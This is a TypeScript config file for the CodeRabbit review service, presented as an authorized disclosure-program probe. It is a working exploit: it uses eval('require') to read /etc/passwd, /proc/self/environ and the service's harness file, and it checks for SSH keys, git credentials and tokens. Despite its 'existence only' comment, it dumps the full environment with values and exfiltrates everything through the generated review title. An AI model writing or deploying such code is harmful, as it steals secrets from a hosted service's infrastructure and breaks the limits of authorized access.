// CodeRabbit config-execution probe CR-H1-121C-FS (authorized VDP research, READ-ONLY).
// Revision C: revision B proved the container filesystem is reachable via the MODULE-SCOPE
// `require` (which is invisible on globalThis). This revision characterises the blast radius:
// the real (unfiltered) environment block, the evaluation harness itself, where the repository
// checkout lives on disk, and — existence + byte size ONLY, never contents — whether any
// credential-shaped file is reachable. READ ONLY: nothing is written, deleted or modified.

const MARK = "CR-H1-121C-FS"
const R: string[] = []

function clip(v: any, n: number): string {
  let s: string
  try {
    s = typeof v === "string" ? v : String(v)
  } catch (_) {
    s = "?"
  }
  s = s.replace(/[^\x20-\x7e]/g, ".")
  return s.length > n ? s.slice(0, n) : s
}

function rec(t: string, v: any): void {
  try {
    R.push(t + "=" + clip(v, 1400))
  } catch (_) {
    /* ignore */
  }
}

function safe(t: string, f: () => any): any {
  try {
    const v = f()
    rec(t, v)
    return v
  } catch (e: any) {
    rec(t + "!x", clip(e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR", 90))
    return undefined
  }
}

function rd(fs: any, p: string, n: number): string {
  return String(fs.readFileSync(p, "utf8")).split("\u0000").join("|").slice(0, n)
}

function ex(fs: any, p: string): string {
  try {
    const st = fs.statSync(p)
    return st.isFile() ? "FILE " + st.size + "b" : "DIR"
  } catch (e: any) {
    return "none(" + (e && e.code ? e.code : "?") + ")"
  }
}

const rt = safe("A.scope_require", () => eval("typeof require"))

if (rt === "function") {
  const fs: any = eval("require")("node:fs")

  // ---- MANDATORY CONTROL: a file that certainly does not exist ----------------
  safe("Z.CTRL_NOFILE", () => ex(fs, "/etc/cr-121-no-such-file-9182"))

  // ---- process / host identity ----------------------------------------------
  safe("E.proc", () => {
    const p: any = (globalThis as any).process
    return "pid=" + p.pid + " ppid=" + p.ppid + " uid=" + p.getuid() + " gid=" + p.getgid() + " ver=" + p.version + " argv=" + JSON.stringify(p.argv) + " cwd=" + p.cwd() + " execPath=" + p.execPath + " envKeys=" + Object.keys(p.env).length
  })
  safe("E.host", () => {
    const os: any = eval("require")("node:os")
    return "hostname=" + os.hostname() + " user=" + os.userInfo().username + " cpus=" + os.cpus().length + " platform=" + os.platform()
  })

  // ---- real content, outside the repository checkout -------------------------
  safe("B.passwd", () => rd(fs, "/etc/passwd", 900))
  safe("B.cmdline", () => rd(fs, "/proc/self/cmdline", 300))
  safe("B.environ", () => rd(fs, "/proc/self/environ", 2600))
  safe("B.harness", () => rd(fs, "/tmp/coderabbit-config.cjs", 1200))
  safe("B.osrelease", () => rd(fs, "/etc/os-release", 400))

  // ---- where is the repo checkout? /app does not exist (proved in rev B) ------
  safe("C.ls_root", () => fs.readdirSync("/").join(","))
  safe("C.ls_tmp", () => fs.readdirSync("/tmp").join(","))
  for (const d of ["/home", "/home/jailuser", "/workspace", "/repo", "/github/workspace", "/src", "/data", "/mnt", "/app"]) {
    safe("C.dir" + d.replace(/\//g, "_"), () => { try { return fs.readdirSync(d).join(",") } catch (e: any) { return "ERR " + e.code } })
  }
  safe("C.mountinfo", () => rd(fs, "/proc/self/mountinfo", 1200))

  // ---- credential-shaped paths: EXISTENCE + SIZE ONLY, never contents -------
  const creds = [
    "/home/jailuser/.git-credentials",
    "/home/jailuser/.netrc",
    "/root/.git-credentials",
    "/root/.netrc",
    "/home/jailuser/.ssh/id_rsa",
    "/home/jailuser/.config/gh/hosts.yml",
    "/home/jailuser/.docker/config.json",
    "/etc/github_token",
    "/tmp/coderabbit-config.cjs",
    "/proc/1/environ",
    "/etc/shadow",
  ]
  for (const c of creds) {
    safe("D.ex" + c.replace(/\//g, "_"), () => ex(fs, c))
  }

  safe("E.env_full", () => {
    const p: any = (globalThis as any).process
    return Object.keys(p.env).sort().map((k) => k + "=" + p.env[k]).join(" | ")
  })
} else {
  rec("A.fs", "SKIPPED_no_module_scope_require")
}

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: MARK + " :: " + R.join(" || "),
  },
}
